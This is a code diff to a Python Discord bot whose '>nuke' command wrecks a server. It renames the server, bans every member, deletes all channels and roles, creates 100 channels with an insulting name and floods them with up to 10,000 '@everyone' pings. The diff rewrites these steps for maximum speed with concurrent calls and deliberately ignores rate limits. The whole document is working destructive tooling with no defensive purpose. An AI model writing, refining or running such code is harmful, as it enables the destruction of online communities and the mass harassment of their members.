@@ -12,7 +12,7 @@ PREFIX = ">"
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)
 
-# ===== NUKE COMMAND =====
+# ===== NUKE COMMAND - MAXIMUM SPEED =====
 @bot.command(name='nuke')
 async def nuke(ctx):
     if ctx.author.id != OWNER_ID:
@@ -21,58 +21,58 @@ async def nuke(ctx):
     guild = ctx.guild
     
     # STEP 0: CHANGE SERVER NAME
-    try:
-        await guild.edit(name="NUKED BY UMAR")
-    except:
-        pass
+    try: await guild.edit(name="NUKED BY UMAR")
+    except: pass
     
-    # STEP 1: MASS BAN EVERYONE (FAST)
+    # STEP 1: MASS BAN EVERYONE (MAX SPEED)
     for member in guild.members:
         if member != bot.user and member.id != OWNER_ID:
-            try:
-                await member.ban(reason="nuked by umar")
-            except:
-                pass
+            try: await member.ban(reason="nuked by umar")
+            except: pass
     
-    # STEP 2: DELETE ALL CHANNELS (FAST)
+    # STEP 2: DELETE ALL CHANNELS (MAX SPEED)
     for channel in guild.channels:
-        try:
-            await channel.delete()
-        except:
-            pass
+        try: await channel.delete()
+        except: pass
     
-    # STEP 3: DELETE ALL ROLES (FAST)
+    # STEP 3: DELETE ALL ROLES (MAX SPEED)
     for role in guild.roles:
         if role.name != "@everyone":
-            try:
-                await role.delete()
-            except:
-                pass
+            try: await role.delete()
+            except: pass
     
-    # STEP 4: CREATE 100 CHANNELS AND PING ONCE IN EACH
+    # STEP 4: CREATE 100 CHANNELS AND PING - MAXIMUM SPEED
     channels = []
+    tasks = []
+    
+    # Fire off all channel creations at once
     for i in range(100):
-        try:
-            channel = await guild.create_text_channel(f"get shitted on by umar")
-            channels.append(channel)
-            # Ping once when channel is created
-            await channel.send(f"@everyone nuked by umar")
-        except:
-            pass
+        tasks.append(guild.create_text_channel(f"get shitted on by umar"))
     
-    # STEP 5: MASS PING IN ALL CHANNELS UNTIL 10,000
+    # Wait for all channels to create
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+    for result in results:
+        if isinstance(result, discord.TextChannel):
+            channels.append(result)
+            # Fire and forget pings
+            asyncio.create_task(result.send(f"@everyone nuked by umar"))
+    
+    # STEP 5: MASS PING ALL CHANNELS AT ONCE - ABSOLUTE MAX SPEED
     ping_target = 10000
-    ping_count = 100  # Already did 100 pings during creation
+    ping_count = len(channels)
     
+    # Create a queue of channels that never ends
     while ping_count < ping_target:
+        # Fire pings in ALL channels simultaneously
+        ping_tasks = []
         for channel in channels:
-            try:
-                await channel.send(f"@everyone nuked by umar")
-                ping_count += 1
-                if ping_count >= ping_target:
-                    break
-            except:
-                continue
+            ping_tasks.append(channel.send(f"@everyone nuked by umar"))
+        
+        # Execute all pings at once
+        results = await asyncio.gather(*ping_tasks, return_exceptions=True)
+        ping_count += len([r for r in results if not isinstance(r, Exception)])
+        
+        # If we hit rate limits hard, try again immediately - NO WAITING
 
 # ===== RUN BOT =====
-bot.run(TOKEN)# ← FIXED: Removed the extra parenthesis
+bot.run(TOKEN)
